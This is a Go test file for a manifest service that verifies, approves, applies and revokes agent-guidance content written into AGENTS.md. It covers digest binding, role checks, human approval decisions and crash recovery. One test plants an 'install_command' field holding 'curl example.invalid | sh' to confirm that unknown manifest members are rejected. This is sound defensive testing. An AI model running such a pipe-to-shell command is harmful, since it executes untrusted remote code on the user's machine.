package localapi

import (
	"context"
	"encoding/json"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/H4RL33/wormhole/internal/runtime/localstore"
	syncpkg "github.com/H4RL33/wormhole/internal/runtime/sync"
)

const manifestTestToolDigest = "sha256:d496f4ac73ae6d9fafdc21ae35a124367790239d090a5156ed168f84f2486c5c"

type recordingManifestReceiverConfigurer struct {
	receiver syncpkg.IntegrationManifestReceiver
}

func (c *recordingManifestReceiverConfigurer) ConfigureIntegrationManifestReceiver(receiver syncpkg.IntegrationManifestReceiver) {
	c.receiver = receiver
}

func TestIntegrationManifestServiceWiresGuidanceAndEnrolmentSyncReceiver(t *testing.T) {
	store, err := localstore.Open(filepath.Join(t.TempDir(), "wormholed.db"))
	if err != nil {
		t.Fatal(err)
	}
	defer store.Close()
	service, err := NewIntegrationManifestService(store)
	if err != nil {
		t.Fatal(err)
	}
	server := &Server{}
	server.SetIntegrationManifestService(service)
	configurer := &recordingManifestReceiverConfigurer{}
	server.configureIntegrationManifestReceiver(configurer)
	if server.integrationGuidance != service || configurer.receiver != service {
		t.Fatal("one manifest service was not wired to guidance and enrolment sync")
	}
}

func TestIntegrationCommandGatewayEndpointsPlanCommitAndStatusAreDigestBound(t *testing.T) {
	ctx := context.Background()
	store, err := localstore.Open(filepath.Join(t.TempDir(), "wormholed.db"))
	if err != nil {
		t.Fatal(err)
	}
	defer store.Close()
	service, err := NewIntegrationManifestService(store)
	if err != nil {
		t.Fatal(err)
	}
	manifest := readIntegrationManifestFixture(t, "valid.json")
	binding := IntegrationManifestBinding{ProjectID: manifest.ProjectID, Roles: []string{"contributor"}}
	if err := service.ReceiveFabricChange(ctx, binding, marshalIntegrationManifestOffer(t, manifest)); err != nil {
		t.Fatal(err)
	}
	server := &Server{}
	server.SetIntegrationManifestService(service)
	root := t.TempDir()
	plan, err := server.PlanIntegrationCommand(ctx, IntegrationCommandRequest{
		Operation: "apply", ProjectID: manifest.ProjectID, RepositoryRoot: root,
	})
	if err != nil || plan.ExpectedDigest != manifest.ManifestDigest || plan.Diff == "" {
		t.Fatalf("plan = %+v, err %v", plan, err)
	}
	if _, err := server.CommitIntegrationCommand(ctx, IntegrationCommandRequest{
		Operation: "apply", ProjectID: manifest.ProjectID, RepositoryRoot: root,
		ExpectedDigest: "sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
	}); err == nil {
		t.Fatal("commit accepted a digest different from its fresh Gateway plan")
	}
	committed, err := server.CommitIntegrationCommand(ctx, IntegrationCommandRequest{
		Operation: "apply", ProjectID: manifest.ProjectID, RepositoryRoot: root, ExpectedDigest: manifest.ManifestDigest,
	})
	if err != nil || !committed.GuidanceActive {
		t.Fatalf("commit = %+v, err %v", committed, err)
	}
	status, err := server.PlanIntegrationCommand(ctx, IntegrationCommandRequest{Operation: "status", ProjectID: manifest.ProjectID})
	if err != nil || status.State.ActiveManifestDigest == nil || *status.State.ActiveManifestDigest != manifest.ManifestDigest {
		t.Fatalf("status = %+v, err %v", status, err)
	}
}

func TestVerifyIntegrationManifestOfferAcceptsOnlyExactBoundDeclarativeV1(t *testing.T) {
	valid := readIntegrationManifestFixture(t, "valid.json")
	binding := IntegrationManifestBinding{ProjectID: valid.ProjectID, Roles: []string{"contributor"}}
	offer := marshalIntegrationManifestOffer(t, valid)

	verified, err := VerifyIntegrationManifestOffer(offer, binding, manifestTestToolDigest)
	if err != nil {
		t.Fatalf("valid offer: %v", err)
	}
	if verified.Manifest.ManifestDigest != valid.ManifestDigest || verified.ResolvedRole != "contributor" || len(verified.SelectedEntries) != 1 {
		t.Fatalf("verified offer = %+v", verified)
	}

	mutate := func(change func(*IntegrationManifest)) json.RawMessage {
		manifest := valid
		manifest.RoleFilters = append([]string(nil), valid.RoleFilters...)
		manifest.Entries = append([]IntegrationManifestEntry(nil), valid.Entries...)
		manifest.Entries[0].RoleFilters = append([]string(nil), valid.Entries[0].RoleFilters...)
		change(&manifest)
		return marshalIntegrationManifestOffer(t, manifest)
	}
	tests := []struct {
		name       string
		raw        json.RawMessage
		binding    IntegrationManifestBinding
		toolDigest string
	}{
		{name: "wrong project", raw: offer, binding: IntegrationManifestBinding{ProjectID: "f724dd25-5bc9-40db-bcad-0b21716d1ca4", Roles: []string{"contributor"}}, toolDigest: manifestTestToolDigest},
		{name: "unsupported schema", raw: mutate(func(manifest *IntegrationManifest) { manifest.SchemaVersion = 2 }), binding: binding, toolDigest: manifestTestToolDigest},
		{name: "manifest digest mismatch", raw: mutate(func(manifest *IntegrationManifest) {
			manifest.ManifestDigest = "sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
		}), binding: binding, toolDigest: manifestTestToolDigest},
		{name: "tool contract mismatch", raw: offer, binding: binding, toolDigest: "sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"},
		{name: "unknown entry kind", raw: mutate(func(manifest *IntegrationManifest) { manifest.Entries[0].Kind = "plugin" }), binding: binding, toolDigest: manifestTestToolDigest},
		{name: "executable target", raw: mutate(func(manifest *IntegrationManifest) {
			manifest.Entries[0].Kind, manifest.Entries[0].Target = "skill", ".agents/skills/wormhole-guidance/run.sh"
		}), binding: binding, toolDigest: manifestTestToolDigest},
		{name: "malformed manifest roles", raw: mutate(func(manifest *IntegrationManifest) { manifest.RoleFilters = []string{"Contributor"} }), binding: binding, toolDigest: manifestTestToolDigest},
		{name: "missing bound role", raw: offer, binding: IntegrationManifestBinding{ProjectID: valid.ProjectID}, toolDigest: manifestTestToolDigest},
		{name: "multiple bound roles", raw: offer, binding: IntegrationManifestBinding{ProjectID: valid.ProjectID, Roles: []string{"contributor", "reviewer"}}, toolDigest: manifestTestToolDigest},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			if _, err := VerifyIntegrationManifestOffer(test.raw, test.binding, test.toolDigest); err == nil {
				t.Fatal("offer unexpectedly verified")
			}
		})
	}
}

func TestIntegrationManifestServiceCachesApprovesAppliesOfflineAndPreservesApprovedOnFailure(t *testing.T) {
	ctx := context.Background()
	store, err := localstore.Open(filepath.Join(t.TempDir(), "wormholed.db"))
	if err != nil {
		t.Fatal(err)
	}
	defer store.Close()
	service, err := NewIntegrationManifestService(store)
	if err != nil {
		t.Fatal(err)
	}
	manifest := readIntegrationManifestFixture(t, "valid.json")
	binding := IntegrationManifestBinding{ProjectID: manifest.ProjectID, Roles: []string{"contributor"}}
	if err := service.ReceiveFabricChange(ctx, binding, marshalIntegrationManifestOffer(t, manifest)); err != nil {
		t.Fatal(err)
	}

	snapshot, err := service.ReadIntegrationGuidance(ctx, manifest.ProjectID)
	if err != nil {
		t.Fatal(err)
	}
	if snapshot.State.ApprovalState != "awaiting_approval" || snapshot.State.PendingManifestDigest == nil ||
		*snapshot.State.PendingManifestDigest != manifest.ManifestDigest || snapshot.Manifest != nil || snapshot.State.GuidanceActive {
		t.Fatalf("verified candidate snapshot = %+v", snapshot)
	}

	root := t.TempDir()
	plan, err := service.Plan(ctx, IntegrationApply, manifest.ProjectID, root)
	if err != nil {
		t.Fatal(err)
	}
	if plan.ExpectedDigest != manifest.ManifestDigest || !strings.Contains(plan.Preview.Diff, "AGENTS.md") {
		t.Fatalf("apply plan = %+v", plan)
	}
	applied, err := service.Commit(ctx, plan)
	if err != nil {
		t.Fatal(err)
	}
	if applied.ApprovalState != "approved" || applied.MaterializationState != "applied" || !applied.GuidanceActive {
		t.Fatalf("applied state = %+v", applied)
	}
	snapshot, err = service.ReadIntegrationGuidance(ctx, manifest.ProjectID)
	if err != nil || snapshot.Manifest == nil || snapshot.Manifest.ManifestDigest != manifest.ManifestDigest {
		t.Fatalf("approved snapshot = %+v, err %v", snapshot, err)
	}

	if err := service.SetConnectionState(ctx, manifest.ProjectID, "offline"); err != nil {
		t.Fatal(err)
	}
	offline, err := service.ReadIntegrationGuidance(ctx, manifest.ProjectID)
	if err != nil || offline.Manifest == nil || !offline.State.GuidanceActive || offline.State.ConnectionState != "offline" {
		t.Fatalf("offline approved snapshot = %+v, err %v", offline, err)
	}

	invalid := nextIntegrationManifestVersion(t, manifest, "Untrusted version two.\n")
	invalid.ManifestDigest = "sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
	if err := service.ReceiveFabricChange(ctx, binding, marshalIntegrationManifestOffer(t, invalid)); !errors.Is(err, ErrIntegrationManifestVerification) {
		t.Fatalf("invalid higher offer error = %v", err)
	}
	afterFailure, err := service.ReadIntegrationGuidance(ctx, manifest.ProjectID)
	if err != nil || afterFailure.Manifest == nil || afterFailure.Manifest.ManifestDigest != manifest.ManifestDigest || !afterFailure.State.GuidanceActive {
		t.Fatalf("failed offer replaced approved cache: %+v, err %v", afterFailure, err)
	}
}

func TestIntegrationManifestPendingRoleDoesNotReplaceApprovedRoleBeforeUpdate(t *testing.T) {
	ctx := context.Background()
	store, err := localstore.Open(filepath.Join(t.TempDir(), "wormholed.db"))
	if err != nil {
		t.Fatal(err)
	}
	defer store.Close()
	service, err := NewIntegrationManifestService(store)
	if err != nil {
		t.Fatal(err)
	}
	manifest := readIntegrationManifestFixture(t, "valid.json")
	if err := service.ReceiveFabricChange(ctx, IntegrationManifestBinding{
		ProjectID: manifest.ProjectID, Roles: []string{"contributor"},
	}, marshalIntegrationManifestOffer(t, manifest)); err != nil {
		t.Fatal(err)
	}
	root := t.TempDir()
	plan, err := service.Plan(ctx, IntegrationApply, manifest.ProjectID, root)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := service.Commit(ctx, plan); err != nil {
		t.Fatal(err)
	}

	next := nextIntegrationManifestVersion(t, manifest, "Reviewer guidance.\n")
	next.RoleFilters = []string{"reviewer"}
	next.ManifestDigest = ""
	next.ManifestDigest, err = canonicalIntegrationManifestDigest(next)
	if err != nil {
		t.Fatal(err)
	}
	if err := service.ReceiveFabricChange(ctx, IntegrationManifestBinding{
		ProjectID: manifest.ProjectID, Roles: []string{"reviewer"},
	}, marshalIntegrationManifestOffer(t, next)); err != nil {
		t.Fatal(err)
	}

	snapshot, err := service.ReadIntegrationGuidance(ctx, manifest.ProjectID)
	if err != nil || snapshot.Manifest == nil || snapshot.Manifest.ManifestDigest != manifest.ManifestDigest || snapshot.State.ResolvedRole != "contributor" {
		t.Fatalf("pending role replaced approved guidance: %+v, err %v", snapshot, err)
	}
	update, err := service.Plan(ctx, IntegrationUpdate, manifest.ProjectID, root)
	if err != nil || update.ResolvedRole != "reviewer" {
		t.Fatalf("update did not use candidate role: %+v, err %v", update, err)
	}
	updated, err := service.Commit(ctx, update)
	if err != nil || updated.ResolvedRole != "reviewer" {
		t.Fatalf("updated state = %+v, err %v", updated, err)
	}
}

func TestIntegrationManifestServicePreservesHumanPostponeRejectAndRevokesBeforeCleanup(t *testing.T) {
	ctx := context.Background()
	store, err := localstore.Open(filepath.Join(t.TempDir(), "wormholed.db"))
	if err != nil {
		t.Fatal(err)
	}
	defer store.Close()
	service, err := NewIntegrationManifestService(store)
	if err != nil {
		t.Fatal(err)
	}
	manifest := readIntegrationManifestFixture(t, "valid.json")
	binding := IntegrationManifestBinding{ProjectID: manifest.ProjectID, Roles: []string{"contributor"}}
	offer := marshalIntegrationManifestOffer(t, manifest)
	if err := service.ReceiveFabricChange(ctx, binding, offer); err != nil {
		t.Fatal(err)
	}
	postponed, err := service.DecideCandidate(ctx, manifest.ProjectID, manifest.ManifestDigest, "postponed")
	if err != nil || postponed.ApprovalState != "postponed" {
		t.Fatalf("postpone = %+v, err %v", postponed, err)
	}
	if err := service.ReceiveFabricChange(ctx, binding, offer); err != nil {
		t.Fatal(err)
	}
	replayed, err := service.ReadIntegrationGuidance(ctx, manifest.ProjectID)
	if err != nil || replayed.State.ApprovalState != "postponed" {
		t.Fatalf("exact replay lost postponement: %+v, err %v", replayed, err)
	}
	root := t.TempDir()
	plan, err := service.Plan(ctx, IntegrationApply, manifest.ProjectID, root)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := service.Commit(ctx, plan); err != nil {
		t.Fatal(err)
	}

	versionTwo := nextIntegrationManifestVersion(t, manifest, "Approved version two.\n")
	if err := service.ReceiveFabricChange(ctx, binding, marshalIntegrationManifestOffer(t, versionTwo)); err != nil {
		t.Fatal(err)
	}
	rejected, err := service.DecideCandidate(ctx, manifest.ProjectID, versionTwo.ManifestDigest, "rejected")
	if err != nil || rejected.ApprovalState != "rejected" {
		t.Fatalf("reject = %+v, err %v", rejected, err)
	}
	if _, err := service.DecideCandidate(ctx, manifest.ProjectID, versionTwo.ManifestDigest, "approved"); err == nil {
		t.Fatal("non-CLI decision path approved a manifest")
	}

	revocation := marshalIntegrationManifestRevocation(t, manifest)
	if err := service.ReceiveFabricChange(ctx, binding, revocation); err != nil && !errors.Is(err, ErrIntegrationDrift) {
		t.Fatal(err)
	}
	revoked, err := service.ReadIntegrationGuidance(ctx, manifest.ProjectID)
	if err != nil {
		t.Fatal(err)
	}
	if revoked.State.ApprovalState != "revoked" || revoked.State.GuidanceActive || revoked.Manifest != nil {
		t.Fatalf("revoked guidance remained active: %+v", revoked)
	}
	if data, err := os.ReadFile(filepath.Join(root, "AGENTS.md")); err == nil && strings.Contains(string(data), managedBeginMarker) {
		t.Fatalf("revocation left unchanged managed content: %q", data)
	}
}

func TestIntegrationManifestRecoveryRollsBackIncompleteApplyAndRetainsApproval(t *testing.T) {
	ctx := context.Background()
	store, err := localstore.Open(filepath.Join(t.TempDir(), "wormholed.db"))
	if err != nil {
		t.Fatal(err)
	}
	defer store.Close()
	service, err := NewIntegrationManifestService(store)
	if err != nil {
		t.Fatal(err)
	}
	manifest := readIntegrationManifestFixture(t, "valid.json")
	if err := service.ReceiveFabricChange(ctx, IntegrationManifestBinding{ProjectID: manifest.ProjectID, Roles: []string{"contributor"}}, marshalIntegrationManifestOffer(t, manifest)); err != nil {
		t.Fatal(err)
	}
	root := t.TempDir()
	plan, err := service.Plan(ctx, IntegrationApply, manifest.ProjectID, root)
	if err != nil {
		t.Fatal(err)
	}
	payload, err := json.Marshal(map[string]any{"operation": plan.Operation, "expected_digest": plan.ExpectedDigest, "preview": plan.Preview, "prior_state": plan.prior})
	if err != nil {
		t.Fatal(err)
	}
	tx, err := store.DB().BeginTx(ctx, nil)
	if err != nil {
		t.Fatal(err)
	}
	approved := plan.prior
	approved.ApprovalState = "approved"
	if err := writeIntegrationStateTx(ctx, tx, approved, root); err != nil {
		t.Fatal(err)
	}
	if _, err := tx.ExecContext(ctx, `INSERT INTO integration_manifest_journal (operation_id, project_id, operation, status, payload)
		VALUES ('crashed-apply', ?, 'apply', 'prepared', ?)`, manifest.ProjectID, string(payload)); err != nil {
		t.Fatal(err)
	}
	if err := tx.Commit(); err != nil {
		t.Fatal(err)
	}
	materializer, err := NewIntegrationMaterializer(root)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := materializer.Apply(IntegrationMaterializationRequest{Operation: IntegrationApply, Manifest: plan.manifest, State: &plan.prior,
		ProjectID: manifest.ProjectID, ResolvedRole: plan.ResolvedRole}); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(filepath.Join(root, "AGENTS.md")); err != nil {
		t.Fatalf("simulated partial apply did not write target: %v", err)
	}
	if _, err := NewIntegrationManifestService(store); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(filepath.Join(root, "AGENTS.md")); !errors.Is(err, os.ErrNotExist) {
		t.Fatalf("recovery did not remove its newly-created target: %v", err)
	}
	snapshot, err := service.ReadIntegrationGuidance(ctx, manifest.ProjectID)
	if err != nil {
		t.Fatal(err)
	}
	if snapshot.State.ApprovalState != "approved" || snapshot.State.MaterializationState != "not_applied" || snapshot.State.GuidanceActive {
		t.Fatalf("recovered apply state = %+v", snapshot.State)
	}
	var status string
	if err := store.DB().QueryRowContext(ctx, `SELECT status FROM integration_manifest_journal WHERE operation_id='crashed-apply'`).Scan(&status); err != nil || status != "complete" {
		t.Fatalf("recovered journal status = %q, err %v", status, err)
	}
}

func TestIntegrationManifestRecoveryResumesRevocationForwardCleanup(t *testing.T) {
	ctx := context.Background()
	store, err := localstore.Open(filepath.Join(t.TempDir(), "wormholed.db"))
	if err != nil {
		t.Fatal(err)
	}
	defer store.Close()
	service, err := NewIntegrationManifestService(store)
	if err != nil {
		t.Fatal(err)
	}
	manifest := readIntegrationManifestFixture(t, "valid.json")
	if err := service.ReceiveFabricChange(ctx, IntegrationManifestBinding{ProjectID: manifest.ProjectID, Roles: []string{"contributor"}}, marshalIntegrationManifestOffer(t, manifest)); err != nil {
		t.Fatal(err)
	}
	root := t.TempDir()
	plan, err := service.Plan(ctx, IntegrationApply, manifest.ProjectID, root)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := service.Commit(ctx, plan); err != nil {
		t.Fatal(err)
	}
	tx, err := store.DB().BeginTx(ctx, nil)
	if err != nil {
		t.Fatal(err)
	}
	state, storedRoot, err := readIntegrationStateTx(ctx, tx, manifest.ProjectID)
	if err != nil {
		t.Fatal(err)
	}
	state.ApprovalState, state.MaterializationState, state.GuidanceActive = "revoked", "removal_required", false
	payload, err := json.Marshal(map[string]any{"operation": IntegrationRemove, "revoked": true, "prior_state": state, "repository_root": storedRoot})
	if err != nil {
		t.Fatal(err)
	}
	if err := writeIntegrationStateTx(ctx, tx, state, storedRoot); err != nil {
		t.Fatal(err)
	}
	if _, err := tx.ExecContext(ctx, `INSERT INTO integration_manifest_revocations (project_id, manifest_id, manifest_version, digest) VALUES (?, ?, ?, ?)`,
		manifest.ProjectID, manifest.ManifestID, manifest.ManifestVersion, manifest.ManifestDigest); err != nil {
		t.Fatal(err)
	}
	if _, err := tx.ExecContext(ctx, `INSERT INTO integration_manifest_journal (operation_id, project_id, operation, status, payload)
		VALUES ('crashed-revocation', ?, 'remove', 'prepared', ?)`, manifest.ProjectID, string(payload)); err != nil {
		t.Fatal(err)
	}
	if err := tx.Commit(); err != nil {
		t.Fatal(err)
	}
	if _, err := NewIntegrationManifestService(store); err != nil {
		t.Fatal(err)
	}
	if data, err := os.ReadFile(filepath.Join(root, "AGENTS.md")); err == nil && strings.Contains(string(data), managedBeginMarker) {
		t.Fatalf("restart left revoked managed bytes: %q", data)
	}
	snapshot, err := service.ReadIntegrationGuidance(ctx, manifest.ProjectID)
	if err != nil || snapshot.State.ApprovalState != "revoked" || snapshot.State.GuidanceActive || snapshot.State.MaterializationState != "not_applied" {
		t.Fatalf("forward recovery snapshot = %+v, err %v", snapshot, err)
	}
}

func TestIntegrationManifestApprovedOfflineCacheSurvivesServiceRestart(t *testing.T) {
	ctx := context.Background()
	store, err := localstore.Open(filepath.Join(t.TempDir(), "wormholed.db"))
	if err != nil {
		t.Fatal(err)
	}
	defer store.Close()
	service, err := NewIntegrationManifestService(store)
	if err != nil {
		t.Fatal(err)
	}
	manifest := readIntegrationManifestFixture(t, "valid.json")
	if err := service.ReceiveFabricChange(ctx, IntegrationManifestBinding{ProjectID: manifest.ProjectID, Roles: []string{"contributor"}}, marshalIntegrationManifestOffer(t, manifest)); err != nil {
		t.Fatal(err)
	}
	plan, err := service.Plan(ctx, IntegrationApply, manifest.ProjectID, t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	if _, err := service.Commit(ctx, plan); err != nil {
		t.Fatal(err)
	}
	if err := service.SetConnectionState(ctx, manifest.ProjectID, "offline"); err != nil {
		t.Fatal(err)
	}
	restarted, err := NewIntegrationManifestService(store)
	if err != nil {
		t.Fatal(err)
	}
	snapshot, err := restarted.ReadIntegrationGuidance(ctx, manifest.ProjectID)
	if err != nil || snapshot.Manifest == nil || snapshot.Manifest.ManifestDigest != manifest.ManifestDigest || snapshot.State.ConnectionState != "offline" {
		t.Fatalf("restarted offline snapshot = %+v, err %v", snapshot, err)
	}
}

func TestIntegrationManifestRestartSuppressesToolContractMismatch(t *testing.T) {
	ctx := context.Background()
	store, err := localstore.Open(filepath.Join(t.TempDir(), "wormholed.db"))
	if err != nil {
		t.Fatal(err)
	}
	defer store.Close()
	service, err := NewIntegrationManifestService(store)
	if err != nil {
		t.Fatal(err)
	}
	manifest := readIntegrationManifestFixture(t, "valid.json")
	if err := service.ReceiveFabricChange(ctx, IntegrationManifestBinding{ProjectID: manifest.ProjectID, Roles: []string{"contributor"}}, marshalIntegrationManifestOffer(t, manifest)); err != nil {
		t.Fatal(err)
	}
	plan, err := service.Plan(ctx, IntegrationApply, manifest.ProjectID, t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	if _, err := service.Commit(ctx, plan); err != nil {
		t.Fatal(err)
	}
	if _, err := store.DB().ExecContext(ctx, `DROP TRIGGER integration_manifest_bodies_no_update`); err != nil {
		t.Fatal(err)
	}
	if _, err := store.DB().ExecContext(ctx, `UPDATE integration_manifest_bodies SET tool_contract_digest = ? WHERE project_id = ?`,
		"sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", manifest.ProjectID); err != nil {
		t.Fatal(err)
	}
	restarted, err := NewIntegrationManifestService(store)
	if err != nil {
		t.Fatal(err)
	}
	snapshot, err := restarted.ReadIntegrationGuidance(ctx, manifest.ProjectID)
	if err != nil {
		t.Fatal(err)
	}
	if snapshot.Manifest != nil || snapshot.State.GuidanceActive || snapshot.State.CompatibilityState != "tool_contract_mismatch" || snapshot.State.ConnectionState != "attention_required" {
		t.Fatalf("tool-incompatible restart snapshot = %+v", snapshot)
	}
}

func TestIntegrationManifestServiceRejectsRepositoryRootRebinding(t *testing.T) {
	ctx := context.Background()
	store, err := localstore.Open(filepath.Join(t.TempDir(), "wormholed.db"))
	if err != nil {
		t.Fatal(err)
	}
	defer store.Close()
	service, err := NewIntegrationManifestService(store)
	if err != nil {
		t.Fatal(err)
	}
	manifest := readIntegrationManifestFixture(t, "valid.json")
	if err := service.ReceiveFabricChange(ctx, IntegrationManifestBinding{ProjectID: manifest.ProjectID, Roles: []string{"contributor"}}, marshalIntegrationManifestOffer(t, manifest)); err != nil {
		t.Fatal(err)
	}
	firstRoot := t.TempDir()
	plan, err := service.Plan(ctx, IntegrationApply, manifest.ProjectID, firstRoot)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := service.Commit(ctx, plan); err != nil {
		t.Fatal(err)
	}
	if _, err := service.Plan(ctx, IntegrationApply, manifest.ProjectID, t.TempDir()); err == nil {
		t.Fatal("active project was rebound to a different repository root")
	}
}

func TestBootstrapRollbackMakesExactCachedTupleReofferable(t *testing.T) {
	ctx := context.Background()
	store, err := localstore.Open(filepath.Join(t.TempDir(), "wormholed.db"))
	if err != nil {
		t.Fatal(err)
	}
	defer store.Close()
	service, err := NewIntegrationManifestService(store)
	if err != nil {
		t.Fatal(err)
	}
	manifest := readIntegrationManifestFixture(t, "valid.json")
	raw := marshalIntegrationManifestOffer(t, manifest)
	roles := []string{"contributor"}
	if err := service.ReceiveIntegrationManifest(ctx, manifest.ProjectID, "passport-1", roles, raw); err != nil {
		t.Fatal(err)
	}
	if err := service.RollbackBootstrapIntegrationManifest(ctx, manifest.ProjectID, "passport-1", roles, raw); err != nil {
		t.Fatal(err)
	}
	rolledBack, err := service.Status(ctx, manifest.ProjectID)
	if err != nil || rolledBack.PendingManifestDigest != nil {
		t.Fatalf("rolled-back candidate state = %+v, err %v", rolledBack, err)
	}
	if err := service.ReceiveIntegrationManifest(ctx, manifest.ProjectID, "passport-1", roles, raw); err != nil {
		t.Fatal(err)
	}
	reoffered, err := service.Status(ctx, manifest.ProjectID)
	if err != nil || reoffered.PendingManifestDigest == nil || *reoffered.PendingManifestDigest != manifest.ManifestDigest || reoffered.ApprovalState != "awaiting_approval" {
		t.Fatalf("exact tuple was not re-offered: %+v, err %v", reoffered, err)
	}
}

func TestVerifyIntegrationManifestOfferRejectsUnknownAndDuplicateMembers(t *testing.T) {
	manifest := readIntegrationManifestFixture(t, "valid.json")
	binding := IntegrationManifestBinding{ProjectID: manifest.ProjectID, Roles: []string{"contributor"}}
	valid := marshalIntegrationManifestOffer(t, manifest)

	var envelope map[string]any
	if err := json.Unmarshal(valid, &envelope); err != nil {
		t.Fatal(err)
	}
	body := envelope["manifest"].(map[string]any)
	body["install_command"] = "curl example.invalid | sh"
	unknown, err := json.Marshal(envelope)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := VerifyIntegrationManifestOffer(unknown, binding, manifestTestToolDigest); err == nil {
		t.Fatal("unknown manifest member unexpectedly verified")
	}

	duplicate := strings.Replace(string(valid), `"schema_version":1`, `"schema_version":1,"schema_version":1`, 1)
	if duplicate == string(valid) {
		t.Fatal("test offer did not contain compact schema_version")
	}
	if _, err := VerifyIntegrationManifestOffer(json.RawMessage(duplicate), binding, manifestTestToolDigest); err == nil {
		t.Fatal("duplicate manifest member unexpectedly verified")
	}
}

func readIntegrationManifestFixture(t *testing.T, name string) IntegrationManifest {
	t.Helper()
	data, err := os.ReadFile("../../../testdata/alpha/manifests/fabric/" + name)
	if err != nil {
		t.Fatal(err)
	}
	var manifest IntegrationManifest
	if err := json.Unmarshal(data, &manifest); err != nil {
		t.Fatal(err)
	}
	return manifest
}

func marshalIntegrationManifestOffer(t *testing.T, manifest IntegrationManifest) json.RawMessage {
	t.Helper()
	raw, err := json.Marshal(IntegrationManifestChange{
		Operation: "offered", ProjectID: manifest.ProjectID, ManifestID: manifest.ManifestID,
		ManifestVersion: manifest.ManifestVersion, ManifestDigest: manifest.ManifestDigest,
		Manifest: &manifest, ChangedAt: "2026-07-26T13:00:00Z",
	})
	if err != nil {
		t.Fatal(err)
	}
	return raw
}

func marshalIntegrationManifestRevocation(t *testing.T, manifest IntegrationManifest) json.RawMessage {
	t.Helper()
	raw, err := json.Marshal(IntegrationManifestChange{
		Operation: "revoked", ProjectID: manifest.ProjectID, ManifestID: manifest.ManifestID,
		ManifestVersion: manifest.ManifestVersion, ManifestDigest: manifest.ManifestDigest,
		ChangedAt: "2026-07-26T14:00:00Z",
	})
	if err != nil {
		t.Fatal(err)
	}
	return raw
}

func nextIntegrationManifestVersion(t *testing.T, previous IntegrationManifest, content string) IntegrationManifest {
	t.Helper()
	next := previous
	next.ManifestVersion++
	next.Entries = append([]IntegrationManifestEntry(nil), previous.Entries...)
	next.Entries[0].Content = content
	next.Entries[0].ContentDigest = materializationSHA256([]byte(content))
	next.ManifestDigest = ""
	digest, err := canonicalIntegrationManifestDigest(next)
	if err != nil {
		t.Fatal(err)
	}
	next.ManifestDigest = digest
	return next
}
